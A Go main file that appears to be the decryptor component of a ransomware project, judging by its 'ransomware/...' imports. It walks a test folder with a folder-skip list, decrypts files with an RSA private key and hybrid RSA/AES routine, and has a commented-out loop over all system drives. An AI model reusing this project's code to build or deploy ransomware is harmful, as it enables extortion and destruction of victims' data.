package main

import (
	"crypto/rsa"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"ransomware/encryption"
	"ransomware/encryption/rsaLib"
	"ransomware/io"
	"ransomware/utils"
	"sync"
)

var (
	filesToVisit = make(chan io.File)
	waitGroup    sync.WaitGroup
)

func main() {
	privKey, err := rsaLib.ReadRSAPrivateKey("cPrivateKey.pem")
	if err != nil {
		panic(err)
	}

	currentDirectory, _ := os.Getwd()
	dir := string(filepath.Dir(currentDirectory) + "/testFolder")

	decryptFiles(dir, privKey)

	// drives := io.GetDrives()
	// for _, drive := range drives {
	// 	decryptFiles(drive, privKey)
	// }

}

func decryptFiles(dirPath string, cPrivKey *rsa.PrivateKey) {

	var ext string
	waitGroup.Add(1)
	go func() {
		filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {

			if d.IsDir() {

				if utils.Contains(utils.FoldersToSkip, filepath.Base(path)) {
					return filepath.SkipDir
				}
			}

			if !d.IsDir() {
				info, err := d.Info()
				if err != nil {
					return err
				}
				ext = filepath.Ext(path)
				filesToVisit <- io.File{Info: info, Path: path, Extension: ext}
			}
			return nil
		})

		defer close(filesToVisit)
		defer waitGroup.Done()
	}()

	waitGroup.Add(1)
	go func() {
		for file := range filesToVisit {
			err := io.DecryptFile(&file, encryption.RSAAESDecrypt, cPrivKey)
			if err != nil {
				fmt.Println("Error decrypting file", file.Path, "Error:", err)
			}
		}
		defer waitGroup.Done()
	}()

	waitGroup.Wait()
}
